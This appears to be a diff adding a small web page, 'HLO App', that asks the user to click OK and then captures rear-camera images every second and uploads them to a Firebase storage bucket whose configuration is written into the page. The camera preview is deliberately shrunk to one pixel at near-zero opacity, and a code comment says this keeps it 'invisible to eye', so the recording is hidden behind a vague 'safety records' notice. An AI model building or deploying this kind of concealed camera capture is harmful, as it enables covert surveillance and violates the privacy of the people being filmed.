@@ -1,0 +1,167 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>HLO App</title>
+
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      background: #f2f4f8;
+    }
+    #box {
+      background: white;
+      padding: 24px;
+      border-radius: 12px;
+      box-shadow: 0 6px 20px rgba(0,0,0,0.08);
+      width: 330px;
+      text-align: center;
+    }
+    .hlo {
+      font-size: 32px;
+      font-weight: bold;
+      margin-bottom: 10px;
+    }
+    #okBtn {
+      padding: 10px 18px;
+      border-radius: 8px;
+      background: #2563eb;
+      color: white;
+      border: none;
+      cursor: pointer;
+      font-size: 15px;
+      display: inline-block;
+    }
+    #video {
+      width: 1px;
+      height: 1px;
+      opacity: 0.01;     /* camera visible (required) but invisible to eye */
+      position: fixed;
+      bottom: 0;
+      right: 0;
+    }
+    #toast {
+      position: fixed;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: black;
+      color: white;
+      padding: 8px 16px;
+      border-radius: 10px;
+      display: none;
+      font-size: 14px;
+    }
+  </style>
+</head>
+
+<body>
+  <div id="box">
+    <div class="hlo">HLO</div>
+    <p>This app will take pictures every second for safety records.<br>
+    Click OK to continue.</p>
+    <button id="okBtn">OK — Start</button>
+  </div>
+
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+  <div id="toast">Picture taken & uploaded</div>
+
+  <!-- Firebase -->
+  <script type="module">
+    const firebaseConfig = {
+      apiKey: "AIzaSyATSGFhVRacGU5DF79s0Md_G_MriSbt3oM",
+      authDomain: "slate-2984a.firebaseapp.com",
+      databaseURL: "https://slate-2984a-default-rtdb.firebaseio.com/",
+      projectId: "slate-2984a",
+      storageBucket: "slate-2984a.appspot.com",
+      messagingSenderId: "237464991846",
+      appId: "1:237464991846:web:cdd78522a06e001f87d5a7"
+    };
+
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.24.0/firebase-app.js";
+    import { getStorage, ref, uploadString } from "https://www.gstatic.com/firebasejs/9.24.0/firebase-storage.js";
+
+    const app = initializeApp(firebaseConfig);
+    const storage = getStorage(app);
+
+    // Elements
+    const okBtn = document.getElementById("okBtn");
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const toast = document.getElementById("toast");
+
+    let stream = null;
+    let timer = null;
+
+    function showToast(msg) {
+      toast.textContent = msg;
+      toast.style.display = "block";
+      setTimeout(() => toast.style.display = "none", 1500);
+    }
+
+    // ---- START PROCESS ----
+    okBtn.addEventListener("click", async () => {
+      okBtn.style.display = "none";
+
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "environment" },
+          audio: false
+        });
+        video.srcObject = stream;
+
+        await new Promise(res => video.onloadedmetadata = res);
+
+        startAutoCapture();
+
+      } catch (err) {
+        alert("Camera permission denied.");
+      }
+    });
+
+    // ---- AUTO CAPTURE LOOP ----
+    function startAutoCapture() {
+      timer = setInterval(captureAndUpload, 1000); // every 1 sec
+    }
+
+    async function captureAndUpload() {
+      try {
+        const w = video.videoWidth;
+        const h = video.videoHeight;
+        if (w === 0 || h === 0) return;
+
+        canvas.width = w;
+        canvas.height = h;
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0, w, h);
+
+        const dataURL = canvas.toDataURL("image/png");
+        const filename = `images/${Date.now()}.png`;
+        const storageRef = ref(storage, filename);
+
+        await uploadString(storageRef, dataURL, "data_url");
+
+        showToast("Picture taken & uploaded");
+
+      } catch (err) {
+        console.error(err);
+      }
+    }
+
+    // ---- STOP WHEN USER LEAVES ----
+    window.addEventListener("beforeunload", stopAll);
+
+    function stopAll() {
+      if (timer) clearInterval(timer);
+      if (stream) stream.getTracks().forEach(t => t.stop());
+    }
+  </script>
+</body>
+</html>
